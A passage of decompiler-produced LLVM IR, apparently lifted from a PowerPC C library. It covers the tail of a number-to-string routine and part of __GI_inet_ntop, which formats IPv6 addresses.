  %v2_10009fe8 = load i32, i32* %r7.global-to-local, align 4
  %v3_10009fe8 = add i32 %v2_10009fe8, 8
  %v4_10009fe8 = inttoptr i32 %v3_10009fe8 to i8*
  store i8 %v1_10009fe8, i8* %v4_10009fe8, align 1
  %v0_10009fec = load i32, i32* %r0.global-to-local, align 4
  %v3_10009fec = icmp eq i32 %v0_10009fec, 48
  br i1 %v3_10009fec, label %dec_label_pc_1000a018, label %dec_label_pc_10009ff4

dec_label_pc_10009ff4:                            ; preds = %dec_label_pc_10009fd0
  %v0_10009ff4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10009ff4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a018

dec_label_pc_10009ffc:                            ; preds = %dec_label_pc_10009fa4
  %v0_1000a000 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a000 = add i32 %v0_1000a000, 1
  store i32 %v1_1000a000, i32* %r8.global-to-local, align 4
  %v2_1000a004 = udiv i32 %v2_10009fd0, %v1_10009fd0
  %v1_1000a008 = mul i32 %v2_1000a004, 10
  store i32 %v1_1000a008, i32* %r0.global-to-local, align 4
  %v2_1000a00c = sub i32 %v2_10009fd0, %v1_1000a008
  %v1_1000a010 = add i32 %v2_1000a00c, 48
  store i32 %v1_1000a010, i32* %r9.global-to-local, align 4
  %v1_1000a014 = trunc i32 %v1_1000a010 to i8
  %v2_1000a014 = load i32, i32* %r6.global-to-local, align 4
  %v3_1000a014 = add i32 %v2_1000a014, 8
  %v4_1000a014 = inttoptr i32 %v3_1000a014 to i8*
  store i8 %v1_1000a014, i8* %v4_1000a014, align 1
  br label %dec_label_pc_1000a018

dec_label_pc_1000a018:                            ; preds = %dec_label_pc_10009fd0, %dec_label_pc_10009ff4, %dec_label_pc_10009ffc
  %v0_1000a018 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a018 = inttoptr i32 %v0_1000a018 to i8*
  %v2_1000a018 = load i8, i8* %v1_1000a018, align 1
  %v3_1000a018 = zext i8 %v2_1000a018 to i32
  %v0_1000a01c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a01c = add i32 %v0_1000a01c, 1
  %v0_1000a020 = load i32, i32* @r1, align 4
  %v2_1000a020 = add i32 %v0_1000a020, %v0_1000a01c
  store i32 %v2_1000a020, i32* %r10.global-to-local, align 4
  %v2_1000a024 = add i32 %v1_1000a01c, %v0_1000a020
  store i32 %v2_1000a024, i32* %r8.global-to-local, align 4
  %v0_1000a028 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a028 = add i32 %v0_1000a028, 1
  store i32 %v1_1000a028, i32* %r4.global-to-local, align 4
  %v1_1000a02c = add i32 %v0_1000a01c, 2
  store i32 %v1_1000a02c, i32* %r11.global-to-local, align 4
  %v1_1000a030 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000a030 = udiv i32 %v3_1000a018, %v1_1000a030
  %v1_1000a034 = mul nuw nsw i32 %v2_1000a030, 10
  store i32 %v1_1000a034, i32* %r0.global-to-local, align 4
  %v2_1000a038 = sub nsw i32 %v3_1000a018, %v1_1000a034
  %v1_1000a03c = add nsw i32 %v2_1000a038, 48
  store i32 %v1_1000a03c, i32* %r9.global-to-local, align 4
  %v1_1000a040 = trunc i32 %v1_1000a03c to i8
  %v3_1000a040 = add i32 %v2_1000a020, 8
  %v4_1000a040 = inttoptr i32 %v3_1000a040 to i8*
  store i8 %v1_1000a040, i8* %v4_1000a040, align 1
  %v0_1000a044 = load i32, i32* %r12.global-to-local, align 4
  %v1_1000a044 = trunc i32 %v0_1000a044 to i8
  %v2_1000a044 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000a044 = add i32 %v2_1000a044, 8
  %v4_1000a044 = inttoptr i32 %v3_1000a044 to i8*
  store i8 %v1_1000a044, i8* %v4_1000a044, align 1
  %v0_1000a048 = load i32, i32* @r1, align 4
  %v1_1000a048 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000a048 = add i32 %v1_1000a048, %v0_1000a048
  store i32 %v2_1000a048, i32* %r7.global-to-local, align 4
  %v0_1000a04c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a04c = add i32 %v0_1000a04c, -1
  store i32 %v1_1000a04c, i32* %ctr.global-to-local, align 4
  %v2_1000a04c = icmp eq i32 %v1_1000a04c, 0
  br i1 %v2_1000a04c, label %dec_label_pc_1000a050, label %dec_label_pc_1000a018.dec_label_pc_10009fa4_crit_edge

dec_label_pc_1000a018.dec_label_pc_10009fa4_crit_edge: ; preds = %dec_label_pc_1000a018
  %v1_10009fa4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009fa4

dec_label_pc_1000a050:                            ; preds = %dec_label_pc_1000a018
  %v2_1000a050 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1000a050, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000a058 = add i32 %v1_1000a048, %v2_1000a050
  store i32 %v2_1000a058, i32* %r9.global-to-local, align 4
  store i32 %v2_1000a050, i32* @r3, align 4
  %v3_1000a060 = add i32 %v2_1000a058, -1
  %v4_1000a060 = inttoptr i32 %v3_1000a060 to i8*
  store i8 0, i8* %v4_1000a060, align 1
  %v0_1000a064 = call i32 @__GI_strlen()
  store i32 %v0_1000a064, i32* %r3.global-to-local, align 4
  %v1_1000a068 = load i32, i32* @r30, align 4
  %v3_1000a068 = icmp ugt i32 %v0_1000a064, %v1_1000a068
  br i1 %v3_1000a068, label %dec_label_pc_1000a070, label %dec_label_pc_1000a084

dec_label_pc_1000a070:                            ; preds = %dec_label_pc_1000a050
  %v0_1000a070 = call i32 @__errno_location()
  store i32 %v0_1000a070, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000a07c = inttoptr i32 %v0_1000a070 to i32*
  store i32 28, i32* %v2_1000a07c, align 4
  %v0_1000a098.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a094

dec_label_pc_1000a084:                            ; preds = %dec_label_pc_1000a050
  %v0_1000a084 = load i32, i32* @r29, align 4
  store i32 %v0_1000a084, i32* %r3.global-to-local, align 4
  store i32 %v2_1000a050, i32* %r4.global-to-local, align 4
  %v2_1000a08c = bitcast i16* %stack_var_-56 to i8*
  %v3_1000a08c = call i32 @strcpy(i32 %v0_1000a084, i8* %v2_1000a08c)
  store i32 %v3_1000a08c, i32* %r3.global-to-local, align 4
  store i32 %v3_1000a08c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a094

dec_label_pc_1000a094:                            ; preds = %dec_label_pc_1000a070, %dec_label_pc_1000a084
  %v0_1000a098 = phi i32 [ %v0_1000a098.pre, %dec_label_pc_1000a070 ], [ %v3_1000a08c, %dec_label_pc_1000a084 ]
  store i32 %v0_10009f50, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a098, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a098

; uselistorder directives
  uselistorder i32 %v0_1000a098, { 1, 0 }
  uselistorder i32 %v2_1000a050, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000a04c, { 1, 0 }
  uselistorder i32 %v2_1000a048, { 1, 0 }
  uselistorder i32 %v0_1000a01c, { 1, 0, 2 }
  uselistorder i32 %v3_1000a018, { 1, 0 }
  uselistorder i32 %v1_10009fe0, { 1, 0, 2 }
  uselistorder i32 %v2_10009fd0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10009fbc, { 1, 0 }
  uselistorder i32 %v0_10009fa8, { 1, 0 }
  uselistorder i32 %v0_1000a0482, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 15, { 0, 1, 5, 4, 2, 3 }
  uselistorder i32 268500992, { 14, 16, 17, 15, 9, 18, 19, 10, 11, 1, 12, 0, 13, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000a094, { 1, 0 }
  uselistorder label %dec_label_pc_1000a018, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1000a0b4 = icmp slt i32 %arg1, 2
  %v3_1000a0b4 = icmp eq i32 %arg1, 2
  store i1 %v1_1000a0b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a0b4, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1000a0b4, label %dec_label_pc_1000a0dc, label %dec_label_pc_1000a0d0

dec_label_pc_1000a0d0:                            ; preds = %entry
  %v1_1000a0d0 = icmp slt i32 %arg1, 10
  %v3_1000a0d0 = icmp eq i32 %arg1, 10
  store i1 %v1_1000a0d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a0d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a0d0, label %dec_label_pc_1000a114.lr.ph, label %dec_label_pc_1000a328

dec_label_pc_1000a0dc:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1000a0ec.476 to i32), i32* @lr, align 4
  %v3_1000a0e8 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1000a320

dec_label_pc_1000a114.lr.ph:                      ; preds = %dec_label_pc_1000a0d0
  %v2_1000a0f0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000a0f0, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a104.477 to i32), i32* @lr, align 4
  %v3_1000a100 = call i32 @__GI_memset(i32 %v2_1000a0f0, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000a13415 = load i32, i32* @r27, align 4
  store i32 %v0_1000a13415, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a114

dec_label_pc_1000a114:                            ; preds = %dec_label_pc_1000a114.lr.ph, %dec_label_pc_1000a114
  %v1_1000a128 = phi i32 [ 0, %dec_label_pc_1000a114.lr.ph ], [ %v1_1000a138, %dec_label_pc_1000a114 ]
  %v0_1000a114 = phi i32 [ %v0_1000a13415, %dec_label_pc_1000a114.lr.ph ], [ %v0_1000a134, %dec_label_pc_1000a114 ]
  %v0_1000a11c = phi i32 [ %v0_1000a13415, %dec_label_pc_1000a114.lr.ph ], [ %v2_1000a134, %dec_label_pc_1000a114 ]
  %v1_1000a114 = phi i32 [ 0, %dec_label_pc_1000a114.lr.ph ], [ %v0_1000a12c, %dec_label_pc_1000a114 ]
  %v2_1000a114 = add i32 %v0_1000a114, %v1_1000a114
  %v3_1000a114 = inttoptr i32 %v2_1000a114 to i8*
  %v4_1000a114 = load i8, i8* %v3_1000a114, align 1
  %v5_1000a114 = zext i8 %v4_1000a114 to i32
  %v1_1000a118 = add i32 %v1_1000a114, 2
  store i32 %v1_1000a118, i32* %r11.global-to-local, align 4
  %v1_1000a11c = add i32 %v0_1000a11c, 1
  %v2_1000a11c = inttoptr i32 %v1_1000a11c to i8*
  %v3_1000a11c = load i8, i8* %v2_1000a11c, align 1
  %v4_1000a11c = zext i8 %v3_1000a11c to i32
  %v1_1000a120 = mul nuw nsw i32 %v5_1000a114, 256
  %v2_1000a124 = or i32 %v4_1000a11c, %v1_1000a120
  %v2_1000a128 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000a128 = add i32 %v2_1000a128, %v1_1000a128
  %v4_1000a128 = inttoptr i32 %v3_1000a128 to i32*
  store i32 %v2_1000a124, i32* %v4_1000a128, align 4
  %v0_1000a12c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a12c = udiv i32 %v0_1000a12c, 2
  %v0_1000a134 = load i32, i32* @r27, align 4
  %v2_1000a134 = add i32 %v0_1000a134, %v0_1000a12c
  store i32 %v2_1000a134, i32* %r9.global-to-local, align 4
  %v1_1000a138 = mul i32 %v1_1000a12c, 4
  %v0_1000a13c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a13c = add i32 %v0_1000a13c, -1
  store i32 %v1_1000a13c, i32* %ctr.global-to-local, align 4
  %v2_1000a13c = icmp eq i32 %v1_1000a13c, 0
  br i1 %v2_1000a13c, label %dec_label_pc_1000a15c.lr.ph, label %dec_label_pc_1000a114

dec_label_pc_1000a15c.lr.ph:                      ; preds = %dec_label_pc_1000a114
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a15c

dec_label_pc_1000a15c:                            ; preds = %dec_label_pc_1000a15c.lr.ph, %dec_label_pc_1000a1a8
  %v0_1000a1ac = phi i32 [ 8, %dec_label_pc_1000a15c.lr.ph ], [ %v1_1000a1ac, %dec_label_pc_1000a1a8 ]
  %v0_1000a19c = phi i32 [ -1, %dec_label_pc_1000a15c.lr.ph ], [ %v0_1000a19c42, %dec_label_pc_1000a1a8 ]
  %v0_1000a18c = phi i32 [ -1, %dec_label_pc_1000a15c.lr.ph ], [ %v0_1000a18c39, %dec_label_pc_1000a1a8 ]
  %v0_1000a160 = phi i32 [ -1, %dec_label_pc_1000a15c.lr.ph ], [ %v0_1000a16035, %dec_label_pc_1000a1a8 ]
  %v0_1000a1a8 = phi i32 [ 0, %dec_label_pc_1000a15c.lr.ph ], [ %v1_1000a1a8, %dec_label_pc_1000a1a8 ]
  %v1_1000a15c = mul i32 %v0_1000a1a8, 4
  %v3_1000a160 = icmp eq i32 %v0_1000a160, -1
  %v2_1000a164 = add i32 %v1_1000a15c, %v2_1000a0f0
  %v3_1000a164 = inttoptr i32 %v2_1000a164 to i32*
  %v4_1000a164 = load i32, i32* %v3_1000a164, align 4
  %v3_1000a168 = icmp eq i32 %v4_1000a164, 0
  br i1 %v3_1000a168, label %dec_label_pc_1000a170, label %dec_label_pc_1000a188

dec_label_pc_1000a170:                            ; preds = %dec_label_pc_1000a15c
  br i1 %v3_1000a160, label %dec_label_pc_1000a174, label %dec_label_pc_1000a180

dec_label_pc_1000a174:                            ; preds = %dec_label_pc_1000a170
  store i32 %v0_1000a1a8, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1000a1a8

dec_label_pc_1000a180:                            ; preds = %dec_label_pc_1000a170
  %v0_1000a180 = load i32, i32* @r31, align 4
  %v1_1000a180 = add i32 %v0_1000a180, 1
  store i32 %v1_1000a180, i32* @r31, align 4
  br label %dec_label_pc_1000a1a8

dec_label_pc_1000a188:                            ; preds = %dec_label_pc_1000a15c
  br i1 %v3_1000a160, label %dec_label_pc_1000a1a8, label %dec_label_pc_1000a18c

dec_label_pc_1000a18c:                            ; preds = %dec_label_pc_1000a188
  %v3_1000a18c = icmp eq i32 %v0_1000a18c, -1
  %v0_1000a1a0.pre = load i32, i32* @r31, align 4
  %v1_1000a194 = load i32, i32* @r30, align 4
  %v3_1000a194 = icmp sgt i32 %v0_1000a1a0.pre, %v1_1000a194
  %or.cond = or i1 %v3_1000a18c, %v3_1000a194
  br i1 %or.cond, label %dec_label_pc_1000a19c, label %dec_label_pc_1000a1a4

dec_label_pc_1000a19c:                            ; preds = %dec_label_pc_1000a18c
  store i32 %v0_1000a19c, i32* @r28, align 4
  store i32 %v0_1000a1a0.pre, i32* @r30, align 4
  br label %dec_label_pc_1000a1a4

dec_label_pc_1000a1a4:                            ; preds = %dec_label_pc_1000a18c, %dec_label_pc_1000a19c
  %v0_1000a18c40 = phi i32 [ %v0_1000a19c, %dec_label_pc_1000a19c ], [ %v0_1000a18c, %dec_label_pc_1000a18c ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a1a8

dec_label_pc_1000a1a8:                            ; preds = %dec_label_pc_1000a188, %dec_label_pc_1000a180, %dec_label_pc_1000a174, %dec_label_pc_1000a1a4
  %v0_1000a19c42 = phi i32 [ %v0_1000a19c, %dec_label_pc_1000a188 ], [ %v0_1000a19c, %dec_label_pc_1000a180 ], [ %v0_1000a1a8, %dec_label_pc_1000a174 ], [ -1, %dec_label_pc_1000a1a4 ]
  %v0_1000a16035 = phi i32 [ -1, %dec_label_pc_1000a188 ], [ %v0_1000a160, %dec_label_pc_1000a180 ], [ %v0_1000a1a8, %dec_label_pc_1000a174 ], [ -1, %dec_label_pc_1000a1a4 ]
  %v0_1000a18c39 = phi i32 [ %v0_1000a18c, %dec_label_pc_1000a188 ], [ %v0_1000a18c, %dec_label_pc_1000a180 ], [ %v0_1000a18c, %dec_label_pc_1000a174 ], [ %v0_1000a18c40, %dec_label_pc_1000a1a4 ]
  %v1_1000a1a8 = add nuw nsw i32 %v0_1000a1a8, 1
  store i32 %v1_1000a1a8, i32* %r11.global-to-local, align 4
  %v1_1000a1ac = add nsw i32 %v0_1000a1ac, -1
  store i32 %v1_1000a1ac, i32* %ctr.global-to-local, align 4
  %v2_1000a1ac = icmp eq i32 %v1_1000a1ac, 0
  br i1 %v2_1000a1ac, label %dec_label_pc_1000a1b0, label %dec_label_pc_1000a15c

dec_label_pc_1000a1b0:                            ; preds = %dec_label_pc_1000a1a8
  %v3_1000a1b0 = icmp eq i32 %v0_1000a19c42, -1
  %v1_1000a1d0 = icmp slt i32 %v0_1000a18c39, -1
  %v3_1000a1d0 = icmp eq i32 %v0_1000a18c39, -1
  store i1 %v1_1000a1d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a1b0, label %dec_label_pc_1000a1d0, label %dec_label_pc_1000a1b8

dec_label_pc_1000a1b8:                            ; preds = %dec_label_pc_1000a1b0
  %v0_1000a1c8.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000a1d0, label %dec_label_pc_1000a1c8, label %dec_label_pc_1000a1c0

dec_label_pc_1000a1c0:                            ; preds = %dec_label_pc_1000a1b8
  %v1_1000a1c0 = load i32, i32* @r30, align 4
  %v2_1000a1c0 = icmp slt i32 %v0_1000a1c8.pre, %v1_1000a1c0
  %v3_1000a1c0 = icmp sgt i32 %v0_1000a1c8.pre, %v1_1000a1c0
  %v4_1000a1c0 = icmp eq i32 %v0_1000a1c8.pre, %v1_1000a1c0
  store i1 %v2_1000a1c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a1c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a1c0, label %dec_label_pc_1000a1c8, label %dec_label_pc_1000a1d0.thread

dec_label_pc_1000a1c8:                            ; preds = %dec_label_pc_1000a1b8, %dec_label_pc_1000a1c0
  store i32 %v0_1000a1c8.pre, i32* @r30, align 4
  store i32 %v0_1000a19c42, i32* @r28, align 4
  br label %dec_label_pc_1000a1d0.thread

dec_label_pc_1000a1d0.thread:                     ; preds = %dec_label_pc_1000a1c8, %dec_label_pc_1000a1c0
  %v0_1000a1d876 = phi i32 [ %v1_1000a1c0, %dec_label_pc_1000a1c0 ], [ %v0_1000a1c8.pre, %dec_label_pc_1000a1c8 ]
  %v0_1000a1d0.ph = phi i32 [ %v0_1000a18c39, %dec_label_pc_1000a1c0 ], [ %v0_1000a19c42, %dec_label_pc_1000a1c8 ]
  %v1_1000a1d059 = icmp slt i32 %v0_1000a1d0.ph, -1
  %v3_1000a1d061 = icmp eq i32 %v0_1000a1d0.ph, -1
  store i1 %v1_1000a1d059, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1d061, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000a1d8

dec_label_pc_1000a1d0:                            ; preds = %dec_label_pc_1000a1b0
  br i1 %v3_1000a1d0, label %dec_label_pc_1000a1e4, label %dec_label_pc_1000a1d0.dec_label_pc_1000a1d8_crit_edge

dec_label_pc_1000a1d0.dec_label_pc_1000a1d8_crit_edge: ; preds = %dec_label_pc_1000a1d0
  %v0_1000a1d8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a1d8

dec_label_pc_1000a1d8:                            ; preds = %dec_label_pc_1000a1d0.dec_label_pc_1000a1d8_crit_edge, %dec_label_pc_1000a1d0.thread
  %v0_1000a1d8 = phi i32 [ %v0_1000a1d876, %dec_label_pc_1000a1d0.thread ], [ %v0_1000a1d8.pre, %dec_label_pc_1000a1d0.dec_label_pc_1000a1d8_crit_edge ]
  %v0_1000a1d062 = phi i32 [ %v0_1000a1d0.ph, %dec_label_pc_1000a1d0.thread ], [ %v0_1000a18c39, %dec_label_pc_1000a1d0.dec_label_pc_1000a1d8_crit_edge ]
  %v1_1000a1d8 = icmp slt i32 %v0_1000a1d8, 1
  %v2_1000a1d8 = icmp sgt i32 %v0_1000a1d8, 1
  %v3_1000a1d8 = icmp eq i32 %v0_1000a1d8, 1
  store i1 %v1_1000a1d8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000a1d8, label %dec_label_pc_1000a1e4, label %dec_label_pc_1000a1e0

dec_label_pc_1000a1e0:                            ; preds = %dec_label_pc_1000a1d8
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000a1e4

dec_label_pc_1000a1e4:                            ; preds = %dec_label_pc_1000a1d8, %dec_label_pc_1000a1d0, %dec_label_pc_1000a1e0
  %v0_1000a1f03 = phi i32 [ %v0_1000a1d062, %dec_label_pc_1000a1d8 ], [ -1, %dec_label_pc_1000a1d0 ], [ -1, %dec_label_pc_1000a1e0 ]
  %v2_1000a1e4 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1000a1e4, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_1000a1f04 = icmp slt i32 %v0_1000a1f03, -1
  %v3_1000a1f06 = icmp eq i32 %v0_1000a1f03, -1
  store i1 %v1_1000a1f04, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1f06, i1* %cr7_eq.global-to-local, align 1
  %v2_1000a260 = icmp slt i32 %tmp, 65535
  %v4_1000a260 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1000a1f0

dec_label_pc_1000a1f0:                            ; preds = %dec_label_pc_1000a1e4, %dec_label_pc_1000a2bc
  %v2_1000a22c = phi i32 [ %v2_1000a1e4, %dec_label_pc_1000a1e4 ], [ %v2_1000a21451, %dec_label_pc_1000a2bc ]
  %v0_1000a200 = phi i32 [ %v0_1000a1f03, %dec_label_pc_1000a1e4 ], [ %v0_1000a1f0, %dec_label_pc_1000a2bc ]
  %v0_1000a220 = phi i32 [ 0, %dec_label_pc_1000a1e4 ], [ %v1_1000a2bc, %dec_label_pc_1000a2bc ]
  %v3_1000a1f07 = phi i1 [ %v3_1000a1f06, %dec_label_pc_1000a1e4 ], [ %v3_1000a1f0, %dec_label_pc_1000a2bc ]
  br i1 %v3_1000a1f07, label %dec_label_pc_1000a220, label %dec_label_pc_1000a1f8

dec_label_pc_1000a1f8:                            ; preds = %dec_label_pc_1000a1f0
  %v2_1000a1f8 = icmp slt i32 %v0_1000a220, %v0_1000a200
  %v4_1000a1f8 = icmp eq i32 %v0_1000a220, %v0_1000a200
  br i1 %v2_1000a1f8, label %dec_label_pc_1000a220, label %dec_label_pc_1000a200

dec_label_pc_1000a200:                            ; preds = %dec_label_pc_1000a1f8
  %v1_1000a200 = load i32, i32* @r30, align 4
  %v2_1000a200 = add i32 %v1_1000a200, %v0_1000a200
  %v2_1000a204 = icmp slt i32 %v0_1000a220, %v2_1000a200
  %v4_1000a204 = icmp eq i32 %v0_1000a220, %v2_1000a200
  store i1 %v2_1000a204, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a204, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000a204, label %dec_label_pc_1000a20c, label %dec_label_pc_1000a220

dec_label_pc_1000a20c:                            ; preds = %dec_label_pc_1000a200
  br i1 %v4_1000a1f8, label %dec_label_pc_1000a210, label %dec_label_pc_1000a2bc

dec_label_pc_1000a210:                            ; preds = %dec_label_pc_1000a20c
  %v3_1000a214 = inttoptr i32 %v2_1000a22c to i8*
  store i8 58, i8* %v3_1000a214, align 1
  %v0_1000a218 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000a218 = add i32 %v0_1000a218, 1
  store i32 %v1_1000a218, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000a2bc

dec_label_pc_1000a220:                            ; preds = %dec_label_pc_1000a200, %dec_label_pc_1000a1f8, %dec_label_pc_1000a1f0
  %v1_1000a220 = icmp slt i32 %v0_1000a220, 0
  %v3_1000a220 = icmp eq i32 %v0_1000a220, 0
  store i1 %v1_1000a220, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a220, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a220, label %dec_label_pc_1000a234.thread, label %dec_label_pc_1000a234

dec_label_pc_1000a234.thread:                     ; preds = %dec_label_pc_1000a220
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000a298

dec_label_pc_1000a234:                            ; preds = %dec_label_pc_1000a220
  %v3_1000a22c = inttoptr i32 %v2_1000a22c to i8*
  store i8 58, i8* %v3_1000a22c, align 1
  %v0_1000a230 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000a230 = add i32 %v0_1000a230, 1
  store i32 %v1_1000a230, i32* %r29.global-to-local, align 4
  %v0_1000a234.pre = load i32, i32* @r31, align 4
  %v1_1000a234 = icmp slt i32 %v0_1000a234.pre, 6
  %v3_1000a234 = icmp eq i32 %v0_1000a234.pre, 6
  store i1 %v1_1000a234, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a234, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a234, label %dec_label_pc_1000a23c, label %dec_label_pc_1000a298

dec_label_pc_1000a23c:                            ; preds = %dec_label_pc_1000a234
  %v0_1000a23c = load i32, i32* @r28, align 4
  %v1_1000a23c = icmp slt i32 %v0_1000a23c, 0
  %v3_1000a23c = icmp eq i32 %v0_1000a23c, 0
  store i1 %v1_1000a23c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a23c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a23c, label %dec_label_pc_1000a244, label %dec_label_pc_1000a298

dec_label_pc_1000a244:                            ; preds = %dec_label_pc_1000a23c
  %v0_1000a244 = load i32, i32* @r30, align 4
  %v1_1000a244 = icmp slt i32 %v0_1000a244, 6
  %v3_1000a244 = icmp eq i32 %v0_1000a244, 6
  store i1 %v1_1000a244, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a244, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a244, label %dec_label_pc_1000a268, label %dec_label_pc_1000a24c

dec_label_pc_1000a24c:                            ; preds = %dec_label_pc_1000a244
  %v1_1000a24c = icmp slt i32 %v0_1000a244, 5
  %v3_1000a24c = icmp eq i32 %v0_1000a244, 5
  store i1 %v1_1000a24c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a24c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a24c, label %dec_label_pc_1000a254, label %dec_label_pc_1000a298

dec_label_pc_1000a254:                            ; preds = %dec_label_pc_1000a24c
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1000a260, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a260, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000a260, label %dec_label_pc_1000a268, label %dec_label_pc_1000a298

dec_label_pc_1000a268:                            ; preds = %dec_label_pc_1000a254, %dec_label_pc_1000a244
  %v1_1000a268 = load i32, i32* @r1, align 4
  %v2_1000a268 = sub i32 %v1_1000a268, %v1_1000a230
  %v0_1000a26c = load i32, i32* @r27, align 4
  %v1_1000a26c = add i32 %v0_1000a26c, 12
  %v1_1000a270 = add i32 %v2_1000a268, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1000a27c.478 to i32), i32* @lr, align 4
  %v3_1000a278 = call i32 @inet_ntop4(i32 %v1_1000a26c, i32 %v1_1000a230, i32 %v1_1000a270)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000a280 = icmp slt i32 %v3_1000a278, 0
  %v3_1000a280 = icmp eq i32 %v3_1000a278, 0
  store i1 %v1_1000a280, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a280, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a280, label %dec_label_pc_1000a338, label %dec_label_pc_1000a288

dec_label_pc_1000a288:                            ; preds = %dec_label_pc_1000a268
  %v0_1000a288 = load i32, i32* @r29, align 4
